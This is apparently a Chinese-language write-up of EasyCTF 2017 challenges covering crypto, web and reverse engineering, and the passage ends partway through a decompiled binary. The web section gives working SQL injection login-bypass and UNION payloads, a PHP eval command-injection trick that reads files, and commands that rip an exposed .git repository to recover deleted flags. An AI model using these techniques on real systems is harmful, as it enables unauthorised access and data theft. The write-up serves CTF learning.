<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907760291207.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907760291207.png!small" alt=""></p></noscript>
</p>
<p>简单验证一下</p>
</p>
<pre><code><p>md5(like) = be1ab1632e4285edc3733b142935c60b</p><p>md5(ly_s) = d64ddd0de1b187cd670783f5e28d681d</p><p>md5(ng_2) = 73d559bc117f816333174e918d0587de</p><p>md5(have) = b42dad5453b2128a32f6612b13ea5d9f</p></code></pre>
</p>
</p>
<p>推测每组就是三个MD5组合的于是将所有的MD5换行拆分再进行一次查找</p>
</p>
<p><img data-original="http://image.3001.net/images/20170329/14907760621701.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907760621701.png!small" alt=""></p></noscript>
</p>
<p>还有7个没有破解从上面的都是4位简单的消息于是把未找出的7个扔<a href="https://md5db.net/">MD5库</a></p>
</p>
<p><img data-original="http://image.3001.net/images/20170329/14907760706955.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907760706955.png!small" alt=""></p></noscript>
</p>
<p>按顺序组合一下OMG_it_took_like_LITerally_s0oO00_long_2_MAK3_md5_werrk_you_have_no_id34 提交给了flag easyctf{OUR_3nCRYpti0n_is_N0T_br0k3n_Ur_brok3n_6c5a390d}</p>
</p>
<p>py优雅解决方式</p>
</p>
<pre><code><p>import hashlib</p><p>hashs = '8a7fca9234d2f19c8abfcd812971a26c8c510dcaefd5061b191ad41d8b57d0ce631f5074f94b32730d0c025f1d7aacd7be1ab1632e4285edc3733b142935c60b90383bad42309f7f6850d2b4250a713d0b2d7a97350465a02554d29d92bfefafd64ddd0de1b187cd670783f5e28d681dd401ed3009d05ce4ef600d364a2c953e4cc801b880dddef59829a5ad08bd8a6373d559bc117f816333174e918d0587de5cca214701dbe9f7f42da7bccf074b811292b9d4dc398866ef95869b22b3941e78635bc95eaa7662a2ddf3e3d45cf1084f4233d6c396e8a0e6fbf597d07b88178d03f3f7757bdbdaaed60729d08bb180b42dad5453b2128a32f6612b13ea5d9fef843bee79633652a6d6ae08e964609f00e883ab809346226dff6887080fb68b'</p><p>def get_md5_list(hashs):</p><p>&nbsp; &nbsp; md5_list = []</p><p>&nbsp; &nbsp; for x in xrange(0, len(hashs), 32):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; md5_list.append(hashs[x:x+32])</p><p>&nbsp; &nbsp; return md5_list</p><p>def gen_char_list():</p><p>&nbsp; &nbsp; char_list = []</p><p>&nbsp; &nbsp; for x in xrange(48, 58): # 0 ~ 9</p><p>&nbsp; &nbsp; &nbsp; &nbsp; char_list.append(chr(x))</p><p>&nbsp; &nbsp; for x in xrange(65, 91): # A ~ Z</p><p>&nbsp; &nbsp; &nbsp; &nbsp; char_list.append(chr(x))</p><p>&nbsp; &nbsp; for x in xrange(97, 123): # a ~ z</p><p>&nbsp; &nbsp; &nbsp; &nbsp; char_list.append(chr(x))</p><p>&nbsp; &nbsp; char_list.append('_') # _</p><p>&nbsp; &nbsp; return char_list</p><p>def brute_force_md5(char_list, md5_list):</p><p>&nbsp; &nbsp; plain_dict = {}</p><p>&nbsp; &nbsp; for c1 in char_list:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; for c2 in char_list:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; for c3 in char_list:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; for c4 in char_list:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; chars = c1 + c2 + c3 + c4</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; md5_obj = hashlib.md5()</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; md5_obj.update(chars)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; md5_str = md5_obj.hexdigest()</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if md5_str in md5_list:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; plain_dict[md5_str] = chars</p><p>&nbsp; &nbsp; return plain_dict</p><p>def get_plain(md5_list, plain_dict):</p><p>&nbsp; &nbsp; plain = ''</p><p>&nbsp; &nbsp; for md5 in md5_list:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; plain += plain_dict[md5]</p><p>&nbsp; &nbsp; return plain</p><p>def main():</p><p>&nbsp; &nbsp; md5_list = get_md5_list(hashs)</p><p>&nbsp; &nbsp; char_list = gen_char_list()</p><p>&nbsp; &nbsp; plain_dict = brute_force_md5(char_list, md5_list)</p><p>&nbsp; &nbsp; plain = get_plain(md5_list, plain_dict)</p><p>&nbsp; &nbsp; print(plain)</p><p>if __name__ == '__main__':</p><p>&nbsp; &nbsp; main()</p></code></pre>
</p>
</p>
<h3>RSA 4</h3>
</p>
<p><b>problem</b></p>
</p>
<p>After doing so much RSA, I finally messed up&#8230;. pls help. I encrypted my secret <a href="https://writeups.easyctf.com/files/rsa4.txt" target="_blank">message</a> but the decryption isn&#8217;t working!!</p>
</p>
<p><b>solution</b></p>
</p>
<p><a href="https://github.com/ValarDragon/CTF-Writeups/tree/master/2017/EasyCTF/RSA%204" target="_blank">writeup</a></p>
</p>
<h3>Premium RSA</h3>
</p>
<p><b>problem</b></p>
</p>
<p>My RSA is the greatest. It&#8217;s so strong, in fact, that I&#8217;ll even give you d! <a href="https://www.easyctf.com/static/d99abfa412f17c8d3229daabd0d6dda800d4f303_ciphertext.txt" target="_blank">file</a></p>
</p>
<p>hint: You thought it&#8217;d be that simple?</p>
</p>
<p><b>solution</b></p>
</p>
<p><a href="https://github.com/ValarDragon/CTF-Writeups/tree/master/2017/EasyCTF/Premium%20RSA" target="_blank">writeup</a></p>
</p>
<h3>Paillier Service</h3>
</p>
<p><b>problem</b></p>
</p>
<p>My friend made some sort of encryption service using the Paillier cryptosystem. Can you get him to encrypt the string easyctf{3ncrypt_m3!} for me? Your flag will be a base 10 integer.</p>
</p>
<p>Access his encryption service at paillier.tcp.easyctf.com 8570</p>
</p>
<p><b>solution</b></p>
</p>
<p><a href="https://github.com/ValarDragon/CTF-Writeups/tree/master/2017/EasyCTF/Paillier%20Service" target="_blank">writeup</a></p>
</p>
<pre><code><p># Paillier.py</p><p>import binascii</p><p>#Gathered from connecting manually</p><p># m = 1, r = 1</p><p>g = 76148136246979412868353192826161253341403849263254887278017187958514513340458179944731332795505616407225022188597713956679924138156737337560391522285190471306102238935856085554943425316921717217530405444795878376547349107664015741971592178799088766898531556269231518219697725522509132047243753064371633643298</p><p># m = 2, r = 1</p><p>g2 = 152296272493958825736706385652322506682807698526509774556034375917029026680916359889462665591011232814450044377195427913359848276313474675120783044570380942612204477871712171109886850633843434435060810889591756753094698215328031483943184357598177533797063112538463036439395451045018264094487506128743267286595</p><p>expectedG2 = g*g</p><p>#Using Factordb, we find that expectedG2-g2 is a perfect square of a prime, which is below</p><p>#http://factordb.com/index.php?id=1100000000882961502</p><p>n = 76148136246979412868353192826161253341403849263254887278017187958514513340458179944731332795505616407225022188597713956679924138156737337560391522285190471306102238935856085554943425316921717217530405444795878376547349107664015741971592178799088766898531556269231518219697725522509132047243753064371633643297</p><p>n2 = n*n</p><p>m2r2 = 642704871773304452155778596282877892451871980828477596157415930594972102473171707034871466334408214634990379265334519095544245651795310239071984348465353456082430791507322024283077057140015173791209040404351064470318177893091562745760770981747716308255111472933684059218100124906239297276402113587510274467857526915676715307055889593001002210535184406398178516901311847346979934161946287183599368736554797730366291587740218078384204696550286009123986874335424671114430592617561047352470044247529967986001239137580719442869043114141323570567593427242451750466586033713111304296116982128148631354597378733690535403149</p><p>#check for no errors</p><p>assert (pow(g,2,n2)*pow(2,n,n2))%n2 == m2r2</p><p>assert (pow(g,2,n2))%n2 == g2</p><p># get int of string easyctf{3ncrypt_m3!}</p><p>goal = b'easyctf{3ncrypt_m3!}'</p><p>hexGoal = str(binascii.hexlify(goal),'utf-8')</p><p>goal = int(hexGoal,16)</p><p>#print(goal)</p><p>#goal is divisible by 5, so use that for Homomorphic property</p><p>m5r1 = pow(g,5,n2)</p><p>goalDiv5 = goal // 5</p><p># Now use the Homomorphic property <img data-original="http://image.3001.net/images/index/smilies/icon_smile.gif" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=':)' class='wp-smiley' /> </p><p>flagInt = pow(m5r1,goalDiv5,n2)</p><p>print(flagInt)</p></code></pre>
<noscript><img src='http://image.3001.net/images/index/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /> </p><p>flagInt = pow(m5r1,goalDiv5,n2)</p><p>print(flagInt)</p></code></pre></noscript>
</p>
</p>
<h2>0&#215;05 Web</h2>
</p>
<h3>Cookie Blog</h3>
</p>
<p><b>problem</b></p>
</p>
<p>I found the cookie monster&#8217;s <a href="http://cookieblog.web.easyctf.com/" target="_blank">blog</a>!</p>
</p>
<p><b>solution</b></p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907760874728.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907760874728.png!small" alt=""></p></noscript>
</p>
<h3>TinyEval</h3>
</p>
<p><b>problem</b></p>
</p>
<p>This <a href="http://tinyeval.web.easyctf.com/">page</a> will evaluate anything you give it.</p>
</p>
<p><b>solution</b></p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907760959953.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907760959953.png!small" alt=""></p></noscript>
</p>
<p>首先想到可能是php的eval()函数于是随手输入echo&#8221;hello world&#8221;提示字符太长最后经过测试最多能输入11个字符。这里用到一个php的技巧</p>
</p>
<pre><code><p>root@kali:~# cat 1.php&nbsp;</p><p>&lt;?php</p><p>eval("echo`ls`;");</p><p>?&gt;</p><p>root@kali:~# php 1.php&nbsp;</p><p>1.php</p><p>Desktop</p><p>Documents</p><p>Downloads</p><p>Music</p><p>Pictures</p><p>Public</p><p>Templates</p><p>Videos</p></code></pre>
</p>
</p>
<p>于是输入echo ls:</p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907761036570.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907761036570.png!small" alt=""></p></noscript>
</p>
<p>看到了flag文件了但是文件名很长除了echo&#8220;就只能再输入5个字符所以要找到一个巧妙的方法多次尝试找到方法</p>
<pre><code>echo`cat *`
</code></pre>
</p>
<p>刚好11个字符获得flag</p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907761115701.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907761115701.png!small" alt=""></p></noscript>
</p>
<h3>Edge 1</h3>
</p>
<p><b>problem</b></p>
</p>
<p>We found Edge inc&#8217;s website! Take a look at it <a href="http://edge1.web.easyctf.com/" target="_blank">here</a>.</p>
</p>
<p>solution</p>
</p>
<p>官方提醒说不能使用扫描器要不然会被BAN但是搞了一通之后没有什么收获提醒说不能使用扫描器于是猜测是不是跟源码泄露有关就手动测试一下</p>
</p>
<pre><code><p>index.php~</p><p>index.php.vim</p><p>index.php.swp</p><p>index.php.swn</p><p>index.php.swo</p><p>index.php.old</p><p>index.php.txt</p><p>index.php.bak</p><p>index.php.zip</p><p>index.php.rar</p><p>/.svn</p><p>/.git</p></code></pre>
</p>
</p>
<p>测试到/.git终于出现惊喜</p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907761215913.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907761215913.png!small" alt=""></p></noscript>
</p>
<p><a href="https://github.com/kost/dvcs-ripper" target="_blank">rip-git</a></p>
</p>
<pre><code><p>root@kali:~# rip-git -v -u http://edge1.web.easyctf.com/.git/</p><p>root@kali:~/.git# git log</p><p>commit ee9061b25d8a35bae8380339f187b44dc26f4999</p><p>Author: Michael &lt;michael@easyctf.com&gt;</p><p>Date: &nbsp; Mon Mar 13 07:11:47 2017 +0000</p><p>&nbsp; &nbsp; Whoops! Remove flag.</p><p>commit afdf86202dc8a3c3d671f2106d5cffa593f2b320</p><p>Author: Michael &lt;michael@easyctf.com&gt;</p><p>Date: &nbsp; Mon Mar 13 07:11:45 2017 +0000</p><p>&nbsp; &nbsp; Initial.</p><p>commit 15ca375e54f056a576905b41a417b413c57df6eb</p><p>Author: Fernando &lt;fermayo@gmail.com&gt;</p><p>Date: &nbsp; Sat Dec 14 12:50:09 2013 -0300</p><p>&nbsp; &nbsp; initial version</p><p>commit 8ac4f76df2ce8db696d75f5f146f4047a315af22</p><p>Author: Fernando Mayo &lt;fermayo@gmail.com&gt;</p><p>Date: &nbsp; Sat Dec 14 07:36:18 2013 -0800</p><p>&nbsp; &nbsp; Initial commit</p></code></pre>
</p>
</p>
<p>回滚到删掉flag之前</p>
</p>
<pre><code>root@kali:~/.git# git reset –hard afdf86202dc8a3c3d671f2106d5cffa593f2b320</code></pre>
</p>
<p>根目录出现了flag.txt:</p>
</p>
<pre><code><p>root@kali:~/.git# cat flag.txt</p><p>easyctf{w3_ev3n_u53_git}</p></code></pre>
</p>
</p>
<p>推荐文章关于WEB敏感文件探测的一点思考</p>
</p>
<h3>Edge 2</h3>
</p>
<p><b>problem</b></p>
</p>
<p>Last time we screwed up. But we&#8217;ve <a href="http://edge2.web.easyctf.com/" target="_blank">learned our lesson</a>.</p>
</p>
<p><b>solution</b></p>
</p>
<p>再次访问 /.git 结果</p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907761335262.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907761335262.png!small" alt=""></p></noscript>
</p>
<p>虽然被禁止列目录但是那些文件依然存在再次尝试使用rip-git结果还是下载下来了接下来就跟Edge 1一样的做法了</p>
</p>
<pre><code><p>root@kali:~# rip-git -v -u http://edge2.web.easyctf.com/.git/</p><p>root@kali:~/.git# git log</p><p>commit a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd</p><p>Author: Michael &lt;michael@easyctf.com&gt;</p><p>Date: &nbsp; Mon Mar 13 07:32:12 2017 +0000</p><p>&nbsp; &nbsp; Prevent directory listing.</p><p>commit 6b4131bb3b84e9446218359414d636bda782d097</p><p>Author: Michael &lt;michael@easyctf.com&gt;</p><p>Date: &nbsp; Mon Mar 13 07:32:10 2017 +0000</p><p>&nbsp; &nbsp; Whoops! Remove flag.</p><p>commit 26e35470d38c4d6815bc4426a862d5399f04865c</p><p>Author: Michael &lt;michael@easyctf.com&gt;</p><p>Date: &nbsp; Mon Mar 13 07:32:09 2017 +0000</p><p>&nbsp; &nbsp; Initial.</p><p>commit 15ca375e54f056a576905b41a417b413c57df6eb</p><p>Author: Fernando &lt;fermayo@gmail.com&gt;</p><p>Date: &nbsp; Sat Dec 14 12:50:09 2013 -0300</p><p>&nbsp; &nbsp; initial version</p></code></pre>
</p>
</p>
<p>同样回到删掉flag之前</p>
</p>
<pre><code><p>root@kali:~/.git# git reset –hard 26e35470d38c4d6815bc4426a862d5399f04865c</p><p>root@kali:~/.git# cat flag.txt</p><p>easyctf{hiding_the_problem_doesn't_mean_it's_gone!}</p></code></pre>
</p>
</p>
<h3>SQL Injection 1</h3>
</p>
<p><b>problem</b></p>
</p>
<p>I need help logging into this website to get my flag! If it helps, my username is <span style="color: rgb(159, 163, 168);">admin&nbsp;</span>.Running sqlmap or the likes will earn you an IP ban.</p>
</p>
<p>hint: What does &#8220;injection&#8221; mean? How can you &#8220;inject&#8221; code into your username to control the username lookup?</p>
</p>
<p><b>solution</b></p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907761469297.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907761469297.png!small" alt=""></p></noscript>
</p>
<p>查看网页源代码估计SQL语句是这样的</p>
</p>
<pre><code>select * from users where username="admin" and password=""</code></pre>
</p>
<p>于是任意构造</p>
</p>
<pre><code><p>" or "1"="1</p><p>select * from users where username="admin" and password="" or "1"="1"</p></code></pre>
</p>
</p>
<p>flag easyctf{a_prepared_statement_a_day_keeps_the_d0ctor_away!}</p>
</p>
<h3>SQL Injection 2</h3>
</p>
<p><b>problem</b></p>
</p>
<p>I&#8217;ve told my friend a billion times that the user called leet1337 doesn&#8217;t exist on this <a href="http://injection2.web.easyctf.com/" target="_blank">website</a>, but he won&#8217;t listen. Could you please login as this user, even though it doesn&#8217;t exist        in the database? Oh and also, make sure that the user has a power level over 9000!!!!Running sqlmap or the likes will earn you an IP ban.</p>
</p>
<p>hint: The columns in the table are (not in order) username, password, power_level, and a unique id.</p>
</p>
<p><b>solution</b></p>
</p>
<p>根据提示估计SQL语句是这样的</p>
</p>
<pre><code>select username, password, power_level, id from table where username="" and password=""</code></pre>
</p>
<p>多次尝试使用union查询#号截断</p>
</p>
<pre><code><p>" union select "leet1337", "leet1337", "leet1337", "9999"#</p><p>select username, password, power_level, id from table where username="" and password="" union select "leet1337", "leet1337", "leet1337", "9999"#"</p></code></pre>
</p>
</p>
<h3>Blogbox</h3>
</p>
<p><b>problem</b></p>
</p>
<p>I found another <a href="http://blogbox.web.easyctf.com/" target="_blank">blog</a>! Do you think you can find a flag on it?</p>
</p>
<p>Hint: Use the search bar to see all the public posts! (And only the public posts!)</p>
</p>
<p><b>solution</b></p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907761634506.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907761634506.png!small" alt=""></p></noscript>
</p>
<p>根据提示进行搜索但是不论输入什么都得不到想要得结果搜索时GET请求类似这样</p>
</p>
<p><a href="http://blogbox.web.easyctf.com/search?query=flag">http://blogbox.web.easyctf.com/search?query=flag</a></p>
</p>
<p>后来看提示我们只能看到公开的 public 文章于是想到搜索有可能还可以传入 public 这个参数最终[<a href="http://blogbox.web.easyctf.com/search?query=ctf&amp;public=0">http://blogbox.web.easyctf.com/search?query=ctf&amp;public=0</a>](<a href="http://blogbox.web.easyctf.com/search?query=ctf&amp;public=0">http://blogbox.web.easyctf.com/search?query=ctf&amp;public=0</a>)</p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907761898093.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907761898093.png!small" alt=""></p></noscript>
</p>
<h3>Web tunnel</h3>
</p>
<p><b>problem</b></p>
</p>
<p>I was just going to search some random cat videos on a Saturday morning when my friend came up to me and told me to reach the end of this <a href="http://tunnel.web.easyctf.com/" target="_blank">tunnel</a>. Can you do it for me?</p>
</p>
<p>Hint: You should write a script for this. The tunnel goes on too deep for any normal human.</p>
</p>
<p><b>solution</b></p>
</p>
<p>打开网站得到一张二维码扫描之后得到的字符串又做为下一个二维码图片的路径就这样循环那么上脚本</p>
</p>
<pre><code><p>import requests</p><p>QR_api = 'https://api.qrserver.com/v1/read-qr-code/'</p><p>QR_name ='DaicO7460493nYSuvLPW'</p><p>while True:</p><p>&nbsp; &nbsp; if 'easyctf' not in QR_name:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; QR_url = 'http://tunnel.web.easyctf.com/images/' + QR_name + '.png'</p><p>&nbsp; &nbsp; &nbsp; &nbsp; r = requests.get(url = QR_api, params = {'fileurl' : QR_url})</p><p>&nbsp; &nbsp; &nbsp; &nbsp; QR_name = r.json()[0]["symbol"][0]["data"]</p><p>&nbsp; &nbsp; else:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; break</p><p>print(QR_name) # easyctf{y0u_sh0uld_b3_t1r3d_tr4v3ll1ng_all_th1s_w4y}</p></code></pre>
</p>
</p>
<h2>0&#215;06 Reverse Engineering</h2>
</p>
<h3>Hexable</h3>
</p>
<p><b>problem</b></p>
</p>
<p>I tried to hide a flag sneakily, can you find it? <a href="https://github.com/EasyCTF/easyctf-2017-problems/raw/master/hexable-autogen/hexable" target="_blank">Download</a></p>
</p>
<p><b>solution</b></p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907762082825.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907762082825.png!small" alt=""></p></noscript>
</p>
<h3>Phunky Python I</h3>
</p>
<p><b>problem</b></p>
</p>
<p>The other day we happened upon a dusty old laptop covered in duct tape and surrounded by several papers with notes scrawled all over them. Upon inspection, we found that the laptop contained several python files labeled <b>phunky</b>.</p>
</p>
<p>We&#8217;ve determined that each of the files contains a mini reversing challenge. The first task is simple: Find the value of <b>x</b> such that the program prints out <b>easyctf</b> (make sure it&#8217;s lowercase!).</p>
</p>
<p><a href="https://github.com/EasyCTF/easyctf-2017-problems/tree/master/phunkypython1" target="_blank">phunky1.py</a></p>
</p>
<p><b>solution</b></p>
</p>
<pre><code><p>x = 9758391023608105872L - 102</p><p>digs = [9758391023608105871L, 9758391023608105867L, 9758391023608105885L, 9758391023608105891L, 9758391023608105869L, 9758391023608105886L, 9758391023608105872L]</p><p>out = ""</p><p>for letter in reversed(digs):</p><p>&nbsp; &nbsp; out = chr(letter - x) + out</p><p>print out + '{' + str(x) + '}'</p></code></pre>
</p>
</p>
<p>flag easyctf{9758391023608105770}</p>
</p>
<h3>Useless Python</h3>
</p>
<p><b>problem</b></p>
</p>
<p>Boredom took over, so I wrote this python file! I didn&#8217;t want anyone to see it though because it doesn&#8217;t actually run, so I used the coolest base-16 encoding to keep it secret. <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/useless-python/useless.py" target="_blank">python</a></p>
</p>
<p><b>solution</b></p>
</p>
<pre><code><p>s=open('useless.py').read()</p><p>s=s.decode('hex')</p><p>while True:</p><p>&nbsp; &nbsp; if 'exec(' in s:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; s = eval(s[5:-1])</p><p>&nbsp; &nbsp; else:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; break</p><p>print s</p></code></pre>
</p>
</p>
<pre><code><p>flag = 'easyctf{python_3x3c_exec_3xec_ex3c}'</p><p>priint flag</p></code></pre>
</p>
</p>
<h3>Phunky Python II</h3>
</p>
<p><b>problem</b></p>
</p>
<p>We stumbled across another phunky Python file. Can you find the redacted value of jkx that makes this program print <b>True</b>?</p>
</p>
<p><b>solution</b></p>
</p>
<p>题目</p>
</p>
<pre><code><p>import operator</p><p>jkx = 0 # REDACTED</p><p>pork = ((12*jkx+44)/4)-(1234/617)*jkx-sum([1, 4, 7])</p><p>jkx *= pork</p><p>pp = filter(lambda g: not any(g % u == 0 for u in range(2, g)), range(2, 10000))</p><p>b = reduce(operator.mul, (pp[i] ** int(str(jkx)[i]) for i in range(len(str(jkx)))))</p><p>print b == 6548044661510965675361835669609097497614277988316628335954865908614987464656662774230164176397886049495203497380194320473112237121935351588106637391652296924206523967496334906449626062538176842451446687574581963609515235677360001918335627990557065870263618484501558703622228018822062325974112864876000000</p></code></pre>
</p>
</p>
<p>第3行简化一下</p>
</p>
<pre><code><p>pork = ((12*jkx+44)/4)-(1234/617)*jkx-sum([1, 4, 7])</p><p>pork = (3*jkx+11)-(1234/617)*jkx-12</p><p>pork = 3*jkx+11-2*jkx-12</p><p>pork = jkx - 1</p></code></pre>
</p>
</p>
<p>结合第四行再次简化</p>
</p>
<pre><code>jkx = jkx*(jkx-1)</code></pre>
</p>
<p>第五行</p>
</p>
<pre><code>pp = filter(lambda g: not any(g % u == 0 for u in range(2, g)), range(2, 10000))</code></pre>
</p>
<p>是生成小于10000的所有质数列表这语法骚得不行Orz</p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907762205802.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907762205802.png!small" alt=""></p></noscript>
</p>
<p>第六行</p>
</p>
<pre><code>b = reduce(operator.mul, (pp[i] ** int(str(jkx)[i]) for i in range(len(str(jkx)))))</code></pre>
</p>
<p>即</p>
</p>
<pre><code><p>b = 1</p><p>for i in range(len(str(jkx))):</p><p>&nbsp; &nbsp; b = b * (pp[i] ** int(str(jkx)[i])</p></code></pre>
</p>
</p>
<p>比如我们输入jkx值为123那么就会计算b = (2 ^ 1) (3 ^ 2) (5 ^ 3)</p>
</p>
<p>参考ValarDragon表哥的解法</p>
</p>
<pre><code><p>import numpy as np</p><p>import math</p><p>#First step:</p><p>#Factor the number</p><p>endnum = 1165547315017833928671818221519514360217364769512850694972634276966608764777139685632107196533251916113636826873618982702626918260245806732321339626796631711528838400321866758812099562803500967678699400226626798016068690575469938736199168207523212687169370000</p><p>primes = filter(lambda g: not any(g % u == 0 for u in range(2, g)), range(2, 10000))</p><p>exps = []</p><p>#get prime factorization</p><p>for i in primes:</p><p>&nbsp; &nbsp; k = 0</p><p>&nbsp; &nbsp; while(endnum % i == 0):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; k+=1</p><p>&nbsp; &nbsp; &nbsp; &nbsp; endnum /= i</p><p>&nbsp; &nbsp; exps.append(k)</p><p>&nbsp; &nbsp; if(endnum == 1):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; break</p><p>print("exponents = %s" %exps)</p><p>#Factorization obtained</p><p>def floorSqrt(n):</p><p>&nbsp; &nbsp; x = n</p><p>&nbsp; &nbsp; y = (x + 1) // 2</p><p>&nbsp; &nbsp; while y &lt; x:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; x = y</p><p>&nbsp; &nbsp; &nbsp; &nbsp; y = (x + n // x) // 2</p><p>&nbsp; &nbsp; return x</p><p>jkx2 = ""</p><p>for k in exps:</p><p>&nbsp; &nbsp; jkx2 += str(k)</p><p>jkx2 = int(jkx2)</p><p>while(True):</p><p>&nbsp; &nbsp; breakEarly = False</p><p>&nbsp; &nbsp; try:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; jkxapprox = floorSqrt(jkx2)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; assert jkx2 == jkxapprox*(jkxapprox+1)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; print("jkx2 = %s" % jkx2)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; print("jkx &nbsp;= %s" % (jkxapprox+1))</p><p>&nbsp; &nbsp; &nbsp; &nbsp; breakEarly = True</p><p>&nbsp; &nbsp; &nbsp; &nbsp; break</p><p>&nbsp; &nbsp; except AssertionError:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; pass</p><p>&nbsp; &nbsp; if(breakEarly):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; break</p><p>&nbsp; &nbsp; jkx2 *= 10</p></code></pre>
</p>
</p>
<h3>Lucky Guess</h3>
</p>
<p><b>problem</b></p>
</p>
<p>Would you like to play <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/luckyguess/guess" target="_blank">a guessing game</a>?</p>
</p>
<p><b>solution</b></p>
</p>
<pre><code><p>int __cdecl main(int argc, const char **argv, const char **envp)</p><p>{</p><p>&nbsp; unsigned int v3; // eax@1</p><p>&nbsp; const char *v5; // rax@8</p><p>&nbsp; __int64 v6; // rax@10</p><p>&nbsp; int v7; // eax@11</p><p>&nbsp; __int64 v8; // rax@12</p><p>&nbsp; int v9; // [sp+0h] [bp-A0h]@1</p><p>&nbsp; int v10; // [sp+4h] [bp-9Ch]@1</p><p>&nbsp; int i; // [sp+8h] [bp-98h]@3</p><p>&nbsp; int v12; // [sp+Ch] [bp-94h]@1</p><p>&nbsp; int v13[36]; // [sp+10h] [bp-90h]@1</p><p>&nbsp; primp();</p><p>&nbsp; qmemcpy(v13, "g", 0x88uLL);</p><p>&nbsp; v3 = time(0LL);</p><p>&nbsp; srand(v3);</p><p>&nbsp; v12 = rand() % 0x4000000;</p><p>&nbsp; v10 = 0;</p><p>&nbsp; v9 = 0;</p><p>&nbsp; while ( 1 )</p><p>&nbsp; {</p><p>&nbsp; &nbsp; v7 = v10++;</p><p>&nbsp; &nbsp; if ( v7 &gt; 22 )</p><p>&nbsp; &nbsp; {</p><p>&nbsp; &nbsp; &nbsp; LODWORD(v8) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;((__int64)&amp;std::cout, (__int64)"no dice.");</p><p>&nbsp; &nbsp; &nbsp; std::ostream::operator&lt;&lt;(v8, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</p><p>&nbsp; &nbsp; &nbsp; return 0;</p><p>&nbsp; &nbsp; }</p><p>&nbsp; &nbsp; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;((__int64)&amp;std::cout, (__int64)"Guess? 